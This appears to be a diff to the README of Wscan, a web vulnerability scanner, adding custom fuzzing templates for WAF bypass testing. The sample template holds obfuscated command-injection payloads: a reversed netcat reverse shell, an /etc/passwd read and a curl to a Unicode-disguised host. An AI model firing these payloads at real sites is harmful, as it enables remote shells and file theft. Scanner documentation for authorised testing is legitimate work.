@@ -35,6 +35,42 @@ Wscan是一款专注于WEB安全的扫描器，它向Nmap致敬，而Nmap已经�
             exclude_poc: [] 
     3.3 通过命令行启用--plug=prometheus，并且指定--url-file(一行一个url)绝对路径，即可进行大范围POC检测
         ./wscan --log-level=debug ws --plug=prometheus  --url-file=/url_file.txt  --html-output=wscan_scan_result.html
+(4) 自定义WEB通用漏洞扫描模板(Waf绕过/Waf测试)
+    4.1 不同于POC测试，自定义WEB通用漏洞扫描插件，会对指定位置的参数进行FUZZ,
+        样例参考 https://github.com/chushuai/wscan/tree/main/core/plugins/custom_tmpl/tmpl/owasp
+        插件样例
+        ---
+        payload:
+          - $(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
+          - /etc/passwd
+          - "`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`"
+        encoder:
+          - URL
+        placeholder:
+          - URLParam
+          - HTMLForm
+          - HTMLMultipartForm
+          - JSONRequest
+        type: "RCE"
+        ...
+    4.2 config.yaml的文件。您需要修改该文件中的以下内容，以指定include_poc的路径。
+        enabled: true
+        depth: 0
+        auto_load_tmpl: false 
+        include_tmpl:
+          - /wscan/core/plugins/custom_tmpl/tmpl/owasp/*.yml
+        exclude_tmpl: [ ]
+        block_status_codes: # 被WAF阻止时HTTP状态码列表,默认值为403"
+          - 403
+        pass_status_codes: # 未被WAF阻止时HTTP状态码列表, 默认值为200或404
+          - 200
+          - 404
+        block_regex: "" # # 被WAF阻止网页的正则表达式
+        pass_regex: "" # 未被WAF阻止网页的正则表达式
+        non_blocked_as_passed: false
+    4.3 通过命令行启用--plug=custom_tmpl，即可对目标网站进行自定义Payload测试。
+        ./wscan --log-level=debug ws --plug=custom_tmpl  --browser  http://testphp.vulnweb.com/  --html-output=wscan_scan_result.html
+
 ```
 # 项目进展
 2023.11.05 发布v1.0.0 二进制版，支持简单的Web通用漏洞检测  
@@ -44,7 +80,9 @@ Wscan是一款专注于WEB安全的扫描器，它向Nmap致敬，而Nmap已经�
 2023.11.26 发布v1.0.4 二进制版，修复XSS、SQL注入漏报的问题，支持对单个URL进行漏洞检测  
 2023.11.30 发布v1.0.5 二进制版，支持浏览器爬虫、支持URL、表单智能过滤  
 2023.12.02 发布v1.0.6 二进制版，支持输出JSON、HTML格式的扫描结果  
-2023.12.03 发布v1.0.7 二进制版，支持Yaml POC扫描插件    
+2023.12.03 发布v1.0.7 二进制版，支持Yaml POC扫描插件   
+2023.12.04 发布v1.0.8 二进制版，支持通过命令行指定要启用的plugins  
+2023.12.09 发布v1.0.9 二进制版，支持自定义WEB通用漏洞扫描模板(Waf绕过/Waf测试)
 
 
 # 开源时间表
